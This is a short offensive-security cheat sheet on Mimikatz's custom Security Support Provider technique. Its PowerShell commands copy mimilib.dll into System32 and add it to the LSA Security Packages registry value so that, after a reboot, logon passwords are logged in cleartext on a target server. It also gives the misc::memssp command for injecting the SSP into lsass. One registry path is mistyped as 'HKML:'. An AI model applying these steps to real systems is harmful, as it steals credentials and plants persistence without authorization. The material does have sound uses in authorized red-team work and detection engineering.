#mimikatz #powershell 
- Injecting our own SSP for programs to use.
- Mimikatz has it's own `mimilib.dll` SSP. This SSP logs local logons, service account and machine account password in clear text on the target server.
- `mimilib.dll` should be present in the system32 directory on the target system, and add mimilib to the `HKLM\SYSTEM\CurrentControlSet\Control\LSA\Security Packages`
```powershell
# move mimilib to system32
Move-Item mimilib.dll C:\Windows\System32

# Get Current value of "Security Packages"
$packages = Get-ItemProperty "HKML:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' | select -ExpandProperty 'Security Packages';

# append mimilib to packages variable
$packages += "mimilib"

# Reset the registry key
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages' -Value $packages
# Reboot
# After reboot all logons are logged to C:\Windows\System32\[kiwissp.log|mimilsa.log]

# Mimikatz can be used to load mimilib in lsass
misc::memssp
```
